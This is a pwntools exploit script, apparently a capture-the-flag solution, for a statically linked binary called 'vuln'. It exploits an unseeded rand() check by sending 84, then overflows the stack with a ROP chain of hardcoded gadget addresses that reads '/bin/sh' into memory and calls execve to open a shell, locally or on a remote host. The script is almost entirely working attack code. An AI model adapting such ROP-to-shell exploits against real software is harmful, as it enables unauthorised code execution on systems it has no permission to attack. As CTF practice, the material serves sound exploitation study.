#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

log.info("""2 vulns - srand() is never called, so first answer is always 84. after that, stack smash -> rop.

vuln is statically linked so theres a buncha gadgets. no PIE so we don't need a leak

realistically, you could just loop until you get the correct answer too. etiher way works""")

RIP_DIST = 120

BSS_CAVE = 0x6b7000 + 0x100
READ  = 0x44a3e0

POP_RDI = 0x00000000004006a6
POP_RSI = 0x0000000000410b93
POP_RDX = 0x0000000000410602
POP_RAX = 0x00000000004005af
RET     = 0x0000000000400416
SYSCALL = 0x0000000000449b75

SYS_EXECVE = 59

io = start()

log.info('triggering win...')
io.sendline(b"84")

#pause() # for debugging
log.info('sending rop chain...')
io.sendline(cyclic(RIP_DIST) +
        p64(POP_RDI) + p64(0) +
        p64(POP_RSI) + p64(BSS_CAVE) +
        p64(POP_RDX) + p64(100) +
        p64(READ) + # read(stdin, BSS_CAVE, 100) // BSS_CAVE = '/bin/sh'
        p64(POP_RDI) + p64(BSS_CAVE) +
        p64(POP_RSI) + p64(0) +
        p64(POP_RDX) + p64(0) +
        p64(POP_RAX) + p64(SYS_EXECVE) +
        p64(SYSCALL) # execve('/bin/sh', NULL, NULL)
        )

log.info("sending binsh string...")
io.sendline(b"/bin/sh\0")

log.info('hopefully spawning shell...')
io.interactive()

